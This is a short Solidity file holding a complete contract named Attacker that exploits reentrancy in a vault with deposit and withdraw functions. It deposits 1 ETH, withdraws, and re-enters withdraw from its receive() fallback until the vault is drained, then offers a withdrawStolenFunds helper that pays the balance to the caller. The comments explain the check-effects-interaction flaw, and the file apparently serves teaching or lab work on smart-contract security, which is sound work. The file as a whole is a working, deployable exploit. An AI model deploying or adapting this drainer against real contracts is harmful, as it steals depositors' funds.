// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVault {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

/**
 * @title Attacker
 * @dev Malicious contract designed to exploit reentrancy vulnerabilities.
 */

contract Attacker {
    IVault public vault;
    uint256 public constant ATTACK_AMOUNT = 1 ether;

    constructor(address _vaultAddress) {
        vault = IVault(_vaultAddress);
    }

    /**
     * @dev Step 1: Deposit funds to pass the "Check" phase of the vault.
     */
    function initiateAttack() external payable {
        require(msg.value >= ATTACK_AMOUNT, "Need 1 ETH to attack");
        vault.deposit{value: ATTACK_AMOUNT}();
        
        // Start the recursive loop
        vault.withdraw(ATTACK_AMOUNT);
    }

    /**
     * @dev Step 2: The "Interaction": the heart of the reentrancy attack.
     * When the vault sends ETH back, this fallback function is triggered.
     */
    
    receive() external payable {
        // If the vault still has money, call withdraw again BEFORE the vault 
        // can update the balance (the "Effect").
        if (address(vault).balance >= ATTACK_AMOUNT) {
            vault.withdraw(ATTACK_AMOUNT);
        }
    }

    /**
     * @dev Helper to get funds out of this contract after the attack.
     */
    function withdrawStolenFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
